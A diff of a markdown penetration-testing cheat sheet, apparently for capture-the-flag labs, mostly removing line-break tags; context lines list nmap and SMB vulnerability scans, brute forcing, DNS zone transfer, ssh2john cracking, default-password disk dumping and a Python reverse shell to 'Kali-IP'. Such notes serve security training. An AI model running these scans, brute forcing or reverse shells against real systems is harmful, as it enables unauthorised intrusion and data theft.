@@ -3,7 +3,7 @@
 [Hacktricks](https://book.hacktricks.xyz/) <br/>
 [GTFOBins](https://gtfobins.github.io/) <br/>
 [WADComs](https://wadcoms.github.io/) <br/>
-<br/>
+
 ## Easy win
 nmap scan <br/>
 hydra ssh/ftp/rdp etc protocols<br/>
@@ -20,7 +20,7 @@ LFI/RFI?<br/>
 Cookies? (bypass login? rce?)<br/>
 Create wordlists for brute force (cewl)<br/>
 Searchsploit?<br/>
-<br/>
+
 ## Port Scanning
 Options:<br/>
 -sT connect scan<br/>
@@ -34,7 +34,7 @@ Options:<br/>
 -p- scans all TCP ports<br/>
 -Pn SOMETIMES causes FALSE POSITIVE, skip the initial stage that checks if the host is up<br/>
 -oG saves the output and uses grep to filter the results to only show lines that contain the word "open" in the "Ports" field 
-<br/>
+
 ## Banner Grabbing
 ```bash
 nc -vn <IP> Port
@@ -70,16 +70,16 @@ nc -vn <IP> Port
 - Port 2049 - NFS service <br/>
 	- **NFS** is a system designed for **client/server** that enables users to seamlessly access files over a network as though these files were located within a local directory.<br/>
 
-<br/>
+
 ## Initial Scan
 nmap -sC -sV -oA nmap/initial (ip address) <br/>
-(default script)(version detection of services)(output to nmap initial) <br/>
+(default script)(version detection of services)(output to nmap initial) 
 ## Detail Scan
 nmap --script all -sC -sV -O -o fulltcpnmap -A -T4 -p- 10.129.77.60 (detail) <br/>
 nmap -sC -sV -O -p- -oA nmap/full 10.10.10.3(detail) <br/>
 enum4linux <br/>
 nmap -A -sV -sU -sC -p- -o fulludpnmap 10.10.10.xxx <br/>
-udp scan <br/>
+udp scan 
 ## SMB Quick Check
 ```
 nmap -p 445 -vv --script=smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse 10.129.77.60
@@ -98,7 +98,6 @@ https://github.com/dievus/threader3000
 ```
 nmap -p 53 10.10.10.1-254 -vv -oA dc 
 ```
-<br/>
 ## Gobuster, FFUF and dnsrecon
 ```
 gobuster dns -d cronos.htb -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt 
@@ -130,7 +129,7 @@ Dig Deeper:<br/>
 dig axfr cronos.htb @10.10.10.13
 ```
 retrieve the entire DNS zone data for the "cronos.htb" domain from the DNS server located at the IP address "10.10.10.13".<br/>
-(AXFR) DNS protocol operation used to transfer the entire zone data from a primary DNS server to a secondary DNS server.<br/>
+(AXFR) DNS protocol operation used to transfer the entire zone data from a primary DNS server to a secondary DNS server.
 
 ## Active Directory Check
 ```bash
@@ -307,9 +306,7 @@ Make sure post/get?<br/>
 TCPDUMP<br/>
 icmp listener<br/>
 tcpdump -ni tun0 icmp<br/>
-tcpdump -xvi tun0 -c 10<br/>
-<br/>
-
+tcpdump -xvi tun0 -c 10
 ## USB
 grab a copy of the USB disk:<br/>
 ```
@@ -317,8 +314,7 @@ sshpass -p raspberry ssh pi@10.10.10.48 "sudo dd if=/dev/sdb | gzip -1 -" | dd o
 ```
 read all of /dev/sdb and print it to STDOUT<br/>
 compress the file read from STDIN (-) and print the result to STDOUT,write that output to usb.gz<br/>
-extundelete usb --restore-all<br/>
-<br/>
+extundelete usb --restore-all
 ## Port Knocking
 TCP<br/>
 knock -v 192.168.0.116 4 27391 159<br/>
@@ -327,8 +323,7 @@ UDP<br/>
 knock -v 192.168.0.116 4 27391 159 -u<br/>
 <br/>
 TCP & UDP<br/>
-knock -v 192.168.1.111 159:udp 27391:tcp 4:udp<br/>
-<br/>
+knock -v 192.168.1.111 159:udp 27391:tcp 4:udp
 ## Brute Force
 ```
 /usr/share/john/ssh2john.py key > hash
@@ -396,7 +391,6 @@ https://gchq.github.io/CyberChef/ (Swiss Knife)<br/>
 https://tio.run/# (debug)<br/>
 Full interactive shell with zsh<br/>
 https://blog.mrtnrdl.de/infosec/2019/05/23/obtain-a-full-interactive-shell-with-zsh.html
-<br/>
 
 ## Upgrade shell
 ```
@@ -427,7 +421,6 @@ python3 -c 'import pty; pty.spawn("/bin/bash")'
 ```
 python -c 'import pty;import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("Kali-IP",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
 ```
-<br/>
 ## Flags
 Windows:<br/>
 ```powershell
